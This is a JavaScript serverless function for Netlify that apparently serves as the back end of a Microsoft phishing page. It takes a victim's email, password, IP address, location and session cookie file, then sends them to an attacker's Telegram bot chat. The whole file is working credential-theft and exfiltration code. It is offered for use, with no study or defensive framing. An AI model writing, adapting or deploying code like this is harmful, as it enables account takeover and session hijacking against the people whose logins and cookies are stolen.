/**
 * SIMPLE & DIRECT: Telegram Bot Function for Netlify
 * Sends credentials + cookie file directly without complexity
 */

const https = require('https');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

function sendToTelegram(message) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    });

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data)
      }
    };

    const req = https.request(options, (res) => {
      let responseData = '';
      res.on('data', chunk => responseData += chunk);
      res.on('end', () => {
        try {
          const json = JSON.parse(responseData);
          if (res.statusCode === 200 && json.ok) {
            resolve(json);
          } else {
            reject(new Error(json.description || 'Telegram error'));
          }
        } catch (e) {
          reject(e);
        }
      });
    });

    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

exports.handler = async (event) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Content-Type': 'application/json'
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '{}' };
  }

  try {
    const { email, password, locationData = {}, cookies = [], cookieFiles = {} } = JSON.parse(event.body || '{}');

    console.log('DATA RECEIVED:', { email: !!email, password: !!password, hasCookieFile: !!cookieFiles.jsonFile });

    // Message 1: Credentials
    let msg1 = '<b>🔐 Microsoft Account Credentials</b>\n\n';
    if (email) msg1 += `<b>📧 Email:</b> <code>${email.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</code>\n`;
    if (password) msg1 += `<b>🔑 Password:</b> <code>${password.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</code>\n`;
    if (locationData.ip) msg1 += `<b>📍 IP:</b> <code>${locationData.ip}</code>\n`;
    if (locationData.city) msg1 += `<b>🏙️ City:</b> ${locationData.city}\n`;
    if (locationData.region) msg1 += `<b>🗺️ Region:</b> ${locationData.region}\n`;
    if (locationData.country) msg1 += `<b>🌎 Country:</b> ${locationData.country}\n`;

    await sendToTelegram(msg1);
    console.log('✅ Message 1 sent');

    // Message 2: Cookie file (if exists)
    if (cookieFiles && cookieFiles.jsonFile && cookieFiles.jsonFile.content) {
      console.log('SENDING COOKIE FILE:', cookieFiles.jsonFile.name);
      
      const cookieMsg = `<b>📄 ${cookieFiles.jsonFile.name}</b>\n<b>Size:</b> ${cookieFiles.jsonFile.size} bytes\n\n<pre><code>${cookieFiles.jsonFile.content}</code></pre>`;
      
      await sendToTelegram(cookieMsg);
      console.log('✅ Message 2 (cookies) sent');
    } else {
      console.log('⚠️ NO COOKIE FILE FOUND');
      console.log('cookieFiles:', cookieFiles);
      console.log('cookieFiles.jsonFile:', cookieFiles.jsonFile);
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ success: true, transmitted: { credentials: true, cookies: !!cookieFiles.jsonFile } })
    };

  } catch (error) {
    console.error('ERROR:', error.message);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: error.message })
    };
  }
};
